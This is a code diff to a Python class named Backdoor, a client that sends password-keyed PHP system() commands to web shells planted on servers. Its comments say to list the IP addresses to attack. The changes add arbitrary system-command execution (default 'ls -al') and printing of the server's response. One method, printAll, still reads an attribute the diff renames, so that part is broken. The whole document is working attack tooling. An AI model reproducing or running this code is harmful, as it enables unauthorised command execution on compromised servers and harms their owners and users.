@@ -15,8 +15,9 @@ class Backdoor:
     first_param_name = ''  # 查询键
     first_param_value = ''  # 查询值
     password = ''  # 连接密码
-    cmd = ''  # 执行命令
+    codeCmd = ''  # 执行代码命令
     post_data = {}  # post数据
+    systemCmd = ''  # 执行系统命令
 
     def printAll(self):
         """
@@ -44,7 +45,7 @@ class Backdoor:
         print("连接密码属性: ", self.password)
         print("执行命令属性: ", self.cmd)
 
-    def setCmd(self, value=""):
+    def setCodeCmd(self, value=""):
         """
         设置执行命令。
 
@@ -60,7 +61,7 @@ class Backdoor:
             示例用法:
             - 调用 `setCmd()` 方法来设置执行命令属性。
         """
-        self.cmd = value
+        self.codeCmd = value
 
     def setPassword(self, value=""):
         """
@@ -96,9 +97,27 @@ class Backdoor:
             示例用法:
             - 调用 `setPostValue()` 方法来创建POST请求的参数字典。
         """
-        return {self.password: self.cmd}
+        return {self.password: self.codeCmd}
 
-    def testUrl(self, Url="", password="admin", automatic="y", timeoutvalue=2):
+    def setSystemCmd(self, cmd=""):
+        """
+        设置执行命令。
+
+        这个方法用于设置执行命令属性 `cmd` 的值，以便执行系统命令。
+
+        Args:
+            cmd (str, optional): 要执行的系统命令字符串。默认为空字符串。
+
+        Returns:
+            None
+
+        Example:
+            示例用法:
+            - 调用 `setCmd()` 方法并传入要执行的系统命令字符串。
+        """
+        self.systemCmd = rf'system("{cmd}");'
+
+    def testUrl(self, Url="", password="admin", cmd="ls -al", automatic="y", timeoutvalue=2):
         """
         测试URL连接并验证密码。
 
@@ -107,6 +126,7 @@ class Backdoor:
         Args:
             Url (str, optional): 要测试的URL。默认为空字符串。
             password (str, optional): 验证密码。默认为 "admin"。
+            cmd (str, optional): 执行命令。默认为 "system('ls -al');"。
             automatic (str, optional): 是否自动执行测试。默认为 "y" 自动。
             timeoutvalue (int, optional): 连接超时时间（秒）。默认为 2 秒。
 
@@ -122,8 +142,9 @@ class Backdoor:
             - 如果连接成功且密码正确，将保存该URL为模板。
             - 您可以使用不同的参数值来自定义测试行为，例如手动检测、更长的超时时间等。
         """
+        self.setSystemCmd(cmd)
         self.setPassword(password)
-        self.setCmd("system('ls -al');")
+        self.setCodeCmd(self.systemCmd)
         self.post_data = self.setPostValue()
         try:
             if Url == "":
@@ -136,13 +157,19 @@ class Backdoor:
                 self.Url, data=self.post_data, timeout=timeoutvalue)
 
             # 检查响应状态码
-            if response.status_code == 200 and response.text:
-                print("连接成功")
-                # 这里可以切换自动检测，手动检测
-                # 还未开发该功能，后期实现。
-                # 相关控制参数automatic="y"为自动"n"为手动，默认为"y"自动
-            else:
+            if response.status_code != 200:
+                print("连接失败")
+            print('---------------------响应---------------------')
+            print(response.text)
+            print('----------------------------------------------')
+            if not response.text:
                 print("密码错误")
+            if '..' in response.text:
+                # 自动检测时响应中包含 ".."则代表成功,否则命令执行失败
+                print("连接成功")
+            else:
+                print("自行检查是否成功")
+
         # 错误响应
         except RequestException as e:
             if "timeout" in str(e):
@@ -186,27 +213,30 @@ class Backdoor:
             self.first_param_name = list(query_dict.keys())[0]
             self.first_param_value = query_dict[self.first_param_name][0]
 
-    def readFileAddress(self):
+    def readFileAddress(self, value=''):
         """
-        从文件中读取IP地址资产。
-
-        该方法用于从文件中读取IP地址资产列表，文件中应包含相关的IP地址，每行一个。
+        将从文件中读取IP地址资产。
+        这个方法用于从文件中读取IP地址资产列表，文件中应包含相关的IP地址，每行一个。
 
         Args:
-            None
+            value (str, optional): 自定义源地址。默认为空字符串。
 
         Returns:
             None
 
         Raises:
-            Exception: 如果发生任何异常，将引发"文件地址获取发生错误"异常。
+            Exception: 如果发生任何异常，将引发 "文件地址获取发生错误" 异常。
 
         Example:
             示例用法:
-            - 创建一个文本文件，写入要攻击的IP地址
-            - 调用 `readFileAddress()` 方法来读取这个文件地址。
+            - 创建一个文本文件，写入要攻击的IP地址。
+            - 调用 `readFileAddress()` 方法来读取文件地址。
+            - 当参数为空时,会自动提醒输入
         """
         try:
-            self.FileAddress = re.sub(r"\"", "", input("输入源地址： "))
+            if value == '':
+                self.FileAddress = re.sub(r"\"", "", input("输入源地址： "))
         except Exception as e:
             print("文件地址获取发生错误", str(e))
+
+    # def  get_IP(self):
